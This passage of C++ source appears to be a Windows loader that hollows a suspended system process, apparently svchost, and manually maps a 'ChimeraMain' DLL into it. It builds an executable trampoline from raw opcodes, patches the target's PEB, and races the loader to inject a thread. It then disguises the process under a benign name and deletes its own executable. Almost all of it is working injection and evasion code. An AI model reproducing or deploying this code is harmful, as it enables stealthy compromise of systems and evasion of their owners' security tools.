        SetEnvironmentVariableW(L"PATH", newPath);
        wprintf(L"[+] Prepended %s to PATH (child inherits)\n", dllDir); fflush(stdout);
    }
    // Create NEW suspended target process -- hollow host
    STARTUPINFOW si{}; si.cb = sizeof(si);
    PROCESS_INFORMATION pi{};
    if (!CreateProcessW(targetPath, targetCmd, NULL, NULL, FALSE,
                        CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {

        wprintf(L"[-] Failed to create suspended %s: error %lu\n", TARGET_PROCESS, GetLastError());
        wprintf(L"    Path tried: %s\n", targetPath);
        fflush(stdout);

        if (hExisting) CloseHandle(hExisting);
        return 1;
    }
    wprintf(L"[+] Suspended %s created (PID %lu)\n", TARGET_PROCESS, pi.dwProcessId); fflush(stdout);



    // Resolve injection DLL path (same dir as this exe)
    wchar_t exeDir[MAX_PATH];
    GetModuleFileNameW(NULL, exeDir, MAX_PATH);
    wchar_t* slash = wcsrchr(exeDir, L'\\');
    if (slash) *slash = L'\0';
    wchar_t dllPath[MAX_PATH];
    swprintf_s(dllPath, L"%s\\%s", exeDir, INJECTION_DLL);
    wprintf(L"[+] Injecting: %s\n", dllPath); fflush(stdout);

    // Manually map ChimeraMain.dll into the suspended process
    LPVOID mappedBase = nullptr;
    if (!ManualMapDll(pi.hProcess, dllPath, &mappedBase)) {
        wprintf(L"[-] ManualMapDll failed -- attempting fallback standard hollowing\n"); fflush(stdout);

        // Fallback: unmap original image and allocate at its base
        BOOL ok = UnmapRemoteSection(pi.hProcess, (LPVOID)0x7FF70000);
        if (!ok) {
            wprintf(L"[-] Fallback: failed to unmap original image\n"); fflush(stdout);
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
            if (hExisting) CloseHandle(hExisting);
            return 1;
        }

        LPVOID allocBase = (LPVOID)0x7FF70000;
        LPVOID allocated = VirtualAllocEx(pi.hProcess, allocBase, 0,
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!allocated) {
            wprintf(L"[-] Fallback: VirtualAllocEx failed\n"); fflush(stdout);
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
            if (hExisting) CloseHandle(hExisting);
            return 1;
        }

        // Write DLL bytes into the fallback allocation
        HANDLE hf2 = CreateFileW(dllPath, GENERIC_READ, 0, NULL, OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL, NULL);
        if (hf2 != INVALID_HANDLE_VALUE) {
            DWORD fileSize = GetFileSize(hf2, NULL);
            BYTE dllBuf[4096];
            ReadFile(hf2, dllBuf, min(fileSize, (DWORD)sizeof(dllBuf)), NULL, NULL);
            CloseHandle(hf2);
            WriteProcessMemorySafe(pi.hProcess, allocated, dllBuf, sizeof(dllBuf));
        }
        mappedBase = allocated;
        wprintf(L"[-] Fallback hollowing done at 0x%p (partial -- no IAT fix)\n", mappedBase);
        fflush(stdout);
    }
    wprintf(L"[+] DLL mapped at remote base: 0x%p\n", mappedBase); fflush(stdout);

    // ── Correct NtCreateThreadEx sequence ─────────────────────────────────────
    // Previous failure: STATUS_PROCESS_IS_TERMINATING (0xC000010A)
    //   → We waited 1s AFTER resuming main thread. svchost detects no SCM within
    //     ~50-100ms and calls ExitProcess. Process is dead before we try to create
    //     our thread.
    //
    // Fix -- reverse the order:
    //   1. Create DLL thread SUSPENDED *before* resuming main thread.
    //      Process is still suspended (not terminating), so NtCreateThreadEx succeeds.
    //   2. Resume main thread (LdrInitializeThunk initializes heap, ~1-5ms).
    //   3. Poll PEB->ProcessHeap via ReadProcessMemory until non-null.
    //      This guarantees heap is ready before DLL thread runs.
    //   4. TerminateThread the main thread BEFORE svchost entry calls ExitProcess.
    //      Loader lock is released by Windows when the owning thread is terminated.
    //   5. Resume DLL thread -- heap is ready, ExitProcess threat eliminated,
    //      overlay runs indefinitely in the process.
    // ──────────────────────────────────────────────────────────────────────────

    // NtCreateThreadEx and NtQueryInformationProcess resolved at startup via InitNtThreadFunctions()

    if (!NtCreateThreadEx || !NtQueryInformationProcess) {
        wprintf(L"[-] Required NT functions not found\n"); fflush(stdout);
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
        if (hExisting) CloseHandle(hExisting);
        return 1;
    }


    // Read DLL entry point (AddressOfEntryPoint = _DllMainCRTStartup, not raw DllMain)
    DWORD epOffset = 0;
    {
        HANDLE hf = CreateFileW(dllPath, GENERIC_READ, FILE_SHARE_READ,
            NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hf != INVALID_HANDLE_VALUE) {
            IMAGE_DOS_HEADER dos{}; DWORD rd;
            ReadFile(hf, &dos, sizeof(dos), &rd, NULL);
            if (dos.e_magic == IMAGE_DOS_SIGNATURE) {
                IMAGE_NT_HEADERS nt{};
                SetFilePointer(hf, dos.e_lfanew, NULL, FILE_BEGIN);
                ReadFile(hf, &nt, sizeof(nt), &rd, NULL);
                if (nt.Signature == IMAGE_NT_SIGNATURE)
                    epOffset = nt.OptionalHeader.AddressOfEntryPoint;
            }
            CloseHandle(hf);
        }
    }
    LPVOID dllEntryPoint = (LPVOID)((BYTE*)mappedBase + epOffset);
    wprintf(L"[+] DLL entry: 0x%p (offset 0x%lX)\n", dllEntryPoint, epOffset); fflush(stdout);

    // (rename deferred to after resume -- see Step 1 below)

    // ── Build trampoline: map section FIRST to get remote addr, then fill code ──
    // The trampoline:
    //   1. Calls LoadLibraryW("user32.dll") -- svchost may not import user32
    //   2. Calls LoadLibraryW("gdi32.dll")  -- needed for overlay drawing
    //   3. Calls _DllMainCRTStartup(base,1,0) -- correct DLL entry convention
    // Strings are stored in trampoline memory at offsets 256+ (past code).
    HANDLE hTramSec = NULL;
    LARGE_INTEGER tramSize; tramSize.QuadPart = 0x1000;
    g_NtCreateSection(&hTramSec, SECTION_ALL_ACCESS, NULL,
        &tramSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
    LPVOID tramRemote = nullptr; SIZE_T tramRemSize = 0x1000;
    g_NtMapViewOfSection(hTramSec, pi.hProcess, &tramRemote, 0, 0, NULL,
        &tramRemSize, 2, 0, PAGE_EXECUTE_READWRITE);
    LPVOID tramLocal = nullptr; SIZE_T tramLocSize = 0x1000;
    g_NtMapViewOfSection(hTramSec, GetCurrentProcess(), &tramLocal, 0, 0, NULL,
        &tramLocSize, 2, 0, PAGE_READWRITE);
    CloseHandle(hTramSec);
    wprintf(L"[+] Trampoline at 0x%p\n", tramRemote); fflush(stdout);

    // Addresses baked into the trampoline
    ULONG_PTR fnLoadLibW  = (ULONG_PTR)GetProcAddress(
        GetModuleHandleA("kernel32.dll"), "LoadLibraryW");
    ULONG_PTR strUser32   = (ULONG_PTR)tramRemote + 256;
    ULONG_PTR strGdi32    = (ULONG_PTR)tramRemote + 280;
    ULONG_PTR mbVal       = (ULONG_PTR)mappedBase;
    ULONG_PTR epVal       = (ULONG_PTR)dllEntryPoint;

    BYTE* tramBuf = (BYTE*)tramLocal;
    memset(tramBuf, 0xCC, 0x1000);  // fill with INT3 for safety
    // Write wide strings at the data region
    wcscpy_s((wchar_t*)(tramBuf + 256), 12, L"user32.dll");
    wcscpy_s((wchar_t*)(tramBuf + 280), 10, L"gdi32.dll");

    BYTE* t = tramBuf;
    // sub rsp, 0x28 -- single frame for all calls
    *t++=0x48;*t++=0x83;*t++=0xEC;*t++=0x28;

    // LoadLibraryW("user32.dll")
    *t++=0x48;*t++=0xB9; memcpy(t,&strUser32,8);  t+=8;
    *t++=0x48;*t++=0xB8; memcpy(t,&fnLoadLibW,8); t+=8;
    *t++=0xFF;*t++=0xD0;

    // LoadLibraryW("gdi32.dll")
    *t++=0x48;*t++=0xB9; memcpy(t,&strGdi32,8);   t+=8;
    *t++=0x48;*t++=0xB8; memcpy(t,&fnLoadLibW,8); t+=8;
    *t++=0xFF;*t++=0xD0;

    // _DllMainCRTStartup(mappedBase, DLL_PROCESS_ATTACH=1, NULL)
    *t++=0x48;*t++=0xB9; memcpy(t,&mbVal,8);      t+=8;  // mov rcx, base
    *t++=0xBA;*t++=0x01;*t++=0x00;*t++=0x00;*t++=0x00;   // mov edx, 1
    *t++=0x45;*t++=0x31;*t++=0xC0;                        // xor r8d, r8d
    *t++=0x48;*t++=0xB8; memcpy(t,&epVal,8);      t+=8;  // mov rax, entry
    *t++=0xFF;*t++=0xD0;                                   // call rax

    *t++=0x48;*t++=0x83;*t++=0xC4;*t++=0x28;              // add rsp, 0x28
    *t++=0xC3;                                             // ret

    g_NtUnmapViewOfSection(GetCurrentProcess(), tramLocal);


    // ── Step 1: Fix current directory in target process so LoadChimeraCore() works ─
    // LoadChimeraCore() calls LoadLibraryW("ChimeraCore.dll").
    // DLL search includes: app dir (System32 for svchost), system dirs, current dir, PATH.
    // Simplest fix: write DLL dir path into PEB->ProcessParameters->CurrentDirectory
    // so the current dir is C:\ChimeraRun\ when DllMain calls LoadLibraryW.
    {
        // RTL_USER_PROCESS_PARAMETERS is at PEB+0x20 (x64)
        // CurrentDirectory.DosPath (UNICODE_STRING) is at PROCESS_PARAMS+0x38
        // CurrentDirectory.Handle is at +0x48
        // We first need to read PROCESS_PARAMS pointer from PEB+0x20
        struct PROCESS_BASIC_INFO_PRE { PVOID Reserved1; PVOID PebBase; PVOID Reserved2[2]; ULONG_PTR UniqueProcessId; PVOID Reserved3; };
        PROCESS_BASIC_INFO_PRE pbiPre{};
        NtQueryInformationProcess(pi.hProcess, 0, &pbiPre, sizeof(pbiPre), NULL);
        if (pbiPre.PebBase) {
            // Read ProcessParameters pointer from PEB+0x20
            PVOID pParams = nullptr;
            SIZE_T rd2;
            ReadProcessMemory(pi.hProcess, (BYTE*)pbiPre.PebBase + 0x20, &pParams, sizeof(pParams), &rd2);
            if (pParams && rd2) {
                // CurrentDirectory.DosPath (UNICODE_STRING) at ProcessParameters+0x38
                // Buffer pointer is at +0x48, Length at +0x38, MaxLength at +0x3A
                // Write new path to the existing buffer (it has MAX_PATH*2 space)
                // First read the buffer pointer
                PVOID bufPtr = nullptr;
                ReadProcessMemory(pi.hProcess, (BYTE*)pParams + 0x48, &bufPtr, sizeof(bufPtr), &rd2);
                if (bufPtr && rd2) {
                    // Use Bootstrap's own directory instead of hardcoded path
                    wchar_t ownDir[MAX_PATH];
                    GetModuleFileNameW(NULL, ownDir, MAX_PATH);
                    wchar_t* sl2 = wcsrchr(ownDir, L'\\');
                    if (sl2) *(sl2 + 1) = L'\0'; // keep trailing backslash
                    USHORT newLen = (USHORT)(wcslen(ownDir) * sizeof(wchar_t));
                    // Write path string into the existing CurrentDirectory buffer
                    WriteProcessMemory(pi.hProcess, bufPtr, ownDir, newLen + sizeof(wchar_t), &rd2);
                    // Update Length field at PParams+0x38
                    WriteProcessMemory(pi.hProcess, (BYTE*)pParams + 0x38, &newLen, sizeof(newLen), &rd2);
                    wprintf(L"[+] Set process current dir to %s\n", ownDir); fflush(stdout);
                }
            }
        }
    }

    // Pre-compute BEFORE ResumeThread to cut hot-path latency to zero
    struct PROCESS_BASIC_INFO { PVOID Reserved1; PVOID PebBase; PVOID Reserved2[2]; ULONG_PTR UniqueProcessId; PVOID Reserved3; };
    PROCESS_BASIC_INFO pbi{};
    NtQueryInformationProcess(pi.hProcess, 0, &pbi, sizeof(pbi), NULL);
    PVOID pPeb       = pbi.PebBase;
    HMODULE hK32Loc  = GetModuleHandleA("kernel32.dll");
    wprintf(L"[+] PEB=0x%p k32=0x%p -- resuming\n", pPeb, hK32Loc); fflush(stdout);

    ResumeThread(pi.hThread);

    // ── HOT PATH: Stage A + Stage B back-to-back, ZERO I/O ──────────────────────
    // Stage A: tight spin until PEB->ProcessHeap != 0  (ntdll sets this first)
    // Stage B: tight spin until kernel32 MZ readable   (kernel32+DllMain are ready)
    // Only after both → create DLL thread → kill main → resume
    // Any wprintf between stages costs ~5ms and loses the race.
    PVOID processHeap = nullptr;
    int   spinA = 0, spinB = 0;
    bool  processDied = false;
    DWORD k32Magic = 0;

    // Stage A
    for (;;) {
        SIZE_T rd = 0;
        ReadProcessMemory(pi.hProcess, (BYTE*)pPeb + 0x30, &processHeap, sizeof(processHeap), &rd);
        if (rd == 0) { processDied = true; break; }
        if (processHeap) break;
        if (++spinA > 2000000) break;
    }

    // Stage B (immediately after A, no I/O)
    // rd=0 does NOT mean the process died -- it means the address isn't in the
    // target VAD yet (kernel32 not loaded by LdrInitializeThunk yet).
    // Only treat as dead if GetExitCodeProcess != STILL_ACTIVE.
    if (!processDied && processHeap) {
        for (;;) {
            SIZE_T rd = 0;
            ReadProcessMemory(pi.hProcess, hK32Loc, &k32Magic, 4, &rd);
            if (k32Magic == 0x5A4D) break;         // MZ = kernel32 mapped and ready
            k32Magic = 0;
            if (rd == 0) {
                // Memory inaccessible: process dead OR kernel32 just not mapped yet
                DWORD ex = 0;
                GetExitCodeProcess(pi.hProcess, &ex);
                if (ex != STILL_ACTIVE) { processDied = true; break; }
                // Still alive -- kernel32 not in VAD yet, keep waiting
            }
            if (++spinB > 8000) break;
            Sleep(1);
        }
    }


    if (processDied || !processHeap || k32Magic != 0x5A4D) {
        DWORD exitCode = 0;
        GetExitCodeProcess(pi.hProcess, &exitCode);
        wprintf(L"[-] Hot path failed: died=%d heap=%p k32=0x%04X spA=%d spB=%d exitCode=0x%08lX\n",
            processDied, processHeap, k32Magic, spinA, spinB, exitCode);

        fflush(stdout);
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
        if (hExisting) CloseHandle(hExisting);
        return 1;
    }

    // ── Create DLL thread + kill main (zero I/O) ─────────────────────────────────
    HANDLE hDllThread = NULL;
    NTSTATUS stThread = NtCreateThreadEx(
        &hDllThread, THREAD_ALL_ACCESS, NULL,
        pi.hProcess, tramRemote, NULL,
        0x1, 0, 0, 0, NULL);
    if (!NT_SUCCESS(stThread) || !hDllThread) {
        wprintf(L"[-] NtCreateThreadEx: 0x%lX\n", stThread); fflush(stdout);
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
        if (hExisting) CloseHandle(hExisting);
        return 1;
    }
    TerminateThread(pi.hThread, 0);
    ResumeThread(hDllThread);
    CloseHandle(hDllThread);

    // Safe to do I/O now (main thread dead, ExitProcess neutralized)
    wprintf(L"[+] OK: heap=0x%p spA=%d k32mapped spB=%d -> overlay\n",
        processHeap, spinA, spinB); fflush(stdout);
    SetProcessImageName(pi.hProcess, BENIGN_PROCESS_NAME);

    wchar_t selfPath[MAX_PATH];
    GetModuleFileNameW(NULL, selfPath, MAX_PATH);
    DeleteFileW(selfPath);

    if (hExisting) CloseHandle(hExisting);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return 0;
}
